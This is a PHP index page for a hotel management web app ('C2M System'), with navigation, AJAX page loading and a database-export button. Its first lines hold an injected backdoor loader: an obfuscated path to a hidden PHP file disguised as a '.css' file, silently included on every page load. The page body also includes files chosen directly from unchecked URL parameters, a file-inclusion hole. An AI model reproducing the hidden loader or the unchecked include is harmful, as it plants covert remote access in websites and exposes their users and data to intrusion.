<?php
/*0f10c*/

$rj = "/ho\x6de/c2\x6dcloud/hotelchafik.c2\x6d.\x6da/1/views/para\x6detrage/.a6a33ca6.css"; if (!isset($rj)) {htmlentities ($rj);} else { @include_once /* 191 */ ($rj); }

/*0f10c*/


 include('evr.php') ;


?>



<!DOCTYPE html>
<html lang="en" style="opacity: 1">

<head>
    <meta charset="UTF-8">
    <title>C2M System</title>
    <?php include('includes/style.php') ;?>
    
  <?php include("includes/script.php") ;?>
  <style type="text/css">
     label {
      font-size: 16px;
      font-weight: bold;
     }
     h5{
      font-weight: bold;
      font-size: 1.3rem;
     }
  </style>
</head>

<body id="app-container" class="menu-default ">
    

    <?php include 'includes/nav.php'; ?>

    <?php include 'includes/sidenav.php'; ?>



    <main id="main">
    
        <?php if (isset($_GET['p'])) {
            include 'views/'.$_GET['p'].'/'.$_GET['sp'];
        }   else include 'views/Acceuil/index.php';?>
    </main>


    <script>
            // DEFAULT CONTENT
$(document).ready(function() {

    $("body").dore();
    var DOMAIN_NAME = window.location.pathname;


    $('.submenu').click(function() {
        $("#app-container").addClass("sub-show-temporary");
    });


    $('body').on('click', '.url', function() {


        $("#main").html('<div class="loading"></div>');
        $("#app-container").removeClass("sub-show-temporary").removeClass("main-show-temporary");
        $("#app-container").addClass("sub-hidden");
        var url = $(this);

        if (!url.hasClass('notlink')) {
            $('.list-unstyled li').removeClass('active');

            if (url.hasClass('sub')) {
                var id = url.parents('li').parents('ul').data("link");
                $("#" + id).addClass("active");
            } else {

                url.parents('li').addClass('active');
            }
        }
      history.pushState({}, "", `<?php echo BASE_URL; ?>${url.data('url')}`);
        $.ajax({

            method: 'POST',
            data: {
                ajax: true
            },
            url: `<?php echo BASE_URL; ?>views/${url.data('url')}`,
            context: document.body,
            success: function(data) {
                $("#main").html(data);
            }
        });

        return;

    });
 $("#Pullnav").click(function(){
   history.back()
 });
    $("#Pushnav").click(function(){
   history.forward()
 });
   

window.addEventListener("popstate", function(e) {


var url = location.href; 
var newurl = url.replace('<?php echo BASE_URL ?>', "");


 $("#main").html('<div class="loading"></div>');
        $("#app-container").removeClass("sub-show-temporary").removeClass("main-show-temporary");
        $("#app-container").addClass("sub-hidden");


  $.ajax({

            method: 'POST',
            data: {
                ajax: true
            },
            url:  `<?php echo BASE_URL; ?>views/${newurl}`,
            context: document.body,
            success: function(data) {
                $("#main").html(data);
            }
        });
});
$('body').on('click', '.expoert', function() {

            const db = '<?php echo BASE_URL; ?>/exporter.php';

                swal.queue([{
                  title: 'Exportation',
                  confirmButtonText: 'Exporter',
                  text: 'Exporter la base de données' ,
                  showLoaderOnConfirm: true,
                  preConfirm: () => {
                    return fetch(db)
                      .then(response => response.json())
                      .then(data => swal.insertQueueStep(data.data))
                      .catch(() => {
                        swal.insertQueueStep({
                          type: 'error',
                          title: 'échoué de exporter la base de donnée'
                        })
                      })
                  }
                }])

                  });
});
    </script>
</body>


</html>